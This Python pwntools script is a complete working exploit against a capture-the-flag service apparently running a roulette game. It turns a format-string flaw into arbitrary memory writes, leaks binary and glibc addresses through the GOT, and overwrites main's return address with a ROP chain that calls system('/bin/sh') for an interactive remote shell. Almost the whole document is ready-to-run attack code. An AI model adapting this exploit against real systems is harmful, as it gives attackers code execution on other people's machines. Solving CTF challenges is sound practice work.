from pwn import *

MASTER_POINTER_OFFSET = 33
SLAVE_POINTER_OFFSET = 47
DESTINATION_STACK_ENTRY_OFFSET = 53
ARBITRARY_BIN_IMG_ADDR_OFFSET = 21
RET_FROM_MAIN_STACK_OFFSET = 17

PUTS_GOT_ENTRY_OFFSET = 0x4020
PRINTF_GOT_ENTRY_OFFSET = 0x4028

conn = remote('challenges.ctfd.io', 30426)

# initializes roulette
def init():
    conn.recvuntil(b'?', timeout=5).decode()
    conn.sendline(b'-1')
    conn.recvuntil(b')', timeout=5).decode()
    conn.sendline(b'202009')
    conn.recvuntil(b':', timeout=5).decode()

# leaks a pointer from a stack at a given offset (first 5 are register values)
def leak_stack_data_at_offset(offset):
    conn.sendline('%{}$p'.format(offset).encode())
    conn.recvline().decode()
    leaked_value = conn.recvline().decode()[:-1]
    conn.recvuntil(b')', timeout=5)
    conn.sendline(b'202009')
    conn.recvuntil(b':', timeout=5).decode()
    result = 0
    try:
        result = int(leaked_value, 16)
    except ValueError:
        return 0
    return result

# overwrites byte at address of the leaked pointer from a stack
def overwrite_byte(offset_to_dereference, byte):
    conn.sendline(('%{}x%{}$hhn'.format(byte, offset_to_dereference)).encode())
    conn.recvline().decode()
    conn.recvuntil(b')', timeout=5).decode()
    conn.sendline(b'202009')
    conn.recvuntil(b':', timeout=5).decode()

# overwrites word (2 bytes) at address of the leaked pointer from a stack
def overwrite_word(offset_to_dereference, word):
    conn.sendline(('%{}x%{}$hn'.format(word, offset_to_dereference)).encode())
    conn.recvline().decode()
    conn.recvuntil(b')', timeout=5).decode()
    conn.sendline(b'202009')
    conn.recvuntil(b':', timeout=5).decode()

# writes data with arbitrary length byte-by-byte at address pointed by a pointer in "slave offset"
def write_arbitrary_data(master_ptr_offset, slave_ptr_offset, data):
    saved_slave_ptr = leak_stack_data_at_offset(slave_ptr_offset)

    last_word = saved_slave_ptr & 0xffff

    while data != 0:
        byte_to_write = data & 0xff
        data >>= 8
        overwrite_byte(slave_ptr_offset, byte_to_write)
        last_word += 0x1
        overwrite_word(master_ptr_offset, last_word)

    overwrite_word(master_ptr_offset, saved_slave_ptr & 0xffff)


# dereferences the pointer stored on stack (be careful, it the stored pointer is invalid, the program will crash)
def dereference_at_offset(offset):
    conn.sendline(('%{}$s'.format(offset)).encode())
    conn.recvline().decode()
    leaked_value = conn.recvline()[:-1]

    container = []

    for byte in leaked_value:
        container.append(byte)

    result = 0 & 0xff

    for byte in container[::-1]:
        result |= byte
        result <<= 8

    result >>= 8
    conn.recvuntil(b')', timeout=5).decode()
    conn.sendline(b'202009')
    conn.recvuntil(b':', timeout=5).decode()
    return result & 0xffffffffffff

def construct_rop_chain(bin_img_base_addr, system_glibc_addr):
    pop_rdi_ret = bin_img_base_addr + 0x164b
    bin_sh_addr = system_glibc_addr + 0x161133
    log.info("Calculated /bin/sh address -> " + hex(bin_sh_addr))
    ret_stack_align_gadget = bin_img_base_addr + 0x1016
    rop_chain = [pop_rdi_ret, bin_sh_addr, ret_stack_align_gadget, system_glibc_addr]
    return rop_chain


def inject_rop_chain(rop_chain, ret_main_stack_addr):
    # make the slave pointer to point at the stack entry which contains a return address from main() stack frame
    write_arbitrary_data(MASTER_POINTER_OFFSET, SLAVE_POINTER_OFFSET, ret_main_stack_addr)

    # write the ROP chain into a stack
    for gadget in rop_chain:
        write_arbitrary_data(SLAVE_POINTER_OFFSET, DESTINATION_STACK_ENTRY_OFFSET, gadget)
        ret_main_stack_addr += 0x8
        write_arbitrary_data(MASTER_POINTER_OFFSET, SLAVE_POINTER_OFFSET, ret_main_stack_addr)

if __name__ == "__main__":
    init()

    # align leaked slave pointer value
    slave_pointer = leak_stack_data_at_offset(MASTER_POINTER_OFFSET)
    slave_pointer += 48
    overwrite_word(MASTER_POINTER_OFFSET, slave_pointer & 0xffff)

    # leak binary image addresses
    log.info("Leaked arbitrary binary image address -> {}".format(hex(leak_stack_data_at_offset(ARBITRARY_BIN_IMG_ADDR_OFFSET))))
    bin_img_base_addr = leak_stack_data_at_offset(ARBITRARY_BIN_IMG_ADDR_OFFSET) - 0x11f1
    puts_got_entry_addr = bin_img_base_addr + PUTS_GOT_ENTRY_OFFSET
    printf_got_entry_addr = bin_img_base_addr + PRINTF_GOT_ENTRY_OFFSET

    log.info("Calculated binary image base address: " + hex(bin_img_base_addr))
    log.info("Calculated printf() GOT entry: " + hex(printf_got_entry_addr))
    log.info("Calculated puts() GOT entry: " + hex(puts_got_entry_addr))

    # leak glibc addresses
    write_arbitrary_data(MASTER_POINTER_OFFSET, SLAVE_POINTER_OFFSET, printf_got_entry_addr)
    printf_glibc_addr = dereference_at_offset(DESTINATION_STACK_ENTRY_OFFSET)
    log.info("Leaked printf() glibc address: " + hex(dereference_at_offset(DESTINATION_STACK_ENTRY_OFFSET)))
    write_arbitrary_data(MASTER_POINTER_OFFSET, SLAVE_POINTER_OFFSET, puts_got_entry_addr)
    puts_glibc_addr = dereference_at_offset(DESTINATION_STACK_ENTRY_OFFSET)
    log.info("Leaked puts() glibc address: " + hex(dereference_at_offset(DESTINATION_STACK_ENTRY_OFFSET)))
    system_glibc_addr = puts_glibc_addr - 0x31fb0
    log.info("Libc 2.30 detected - calculated system() glibc address: " + hex(system_glibc_addr))

    rop_chain = construct_rop_chain(bin_img_base_addr, system_glibc_addr)

    stack_frame_full_byte_offset = ((DESTINATION_STACK_ENTRY_OFFSET - RET_FROM_MAIN_STACK_OFFSET) * 8)
    ret_main_stack_addr = leak_stack_data_at_offset(SLAVE_POINTER_OFFSET) - stack_frame_full_byte_offset

    log.info("Injecting ROP chain into a stack...")

    inject_rop_chain(rop_chain, ret_main_stack_addr)
    # force the program to exit from main function stack frame in order to trigger the injected ROP chain execution
    conn.sendline(b'1337')
    print(conn.recvuntil(b')', timeout=5).decode())
    conn.sendline(b'13.37')
    print(conn.recvuntil(b'!', timeout=5).decode())
    conn.interactive()
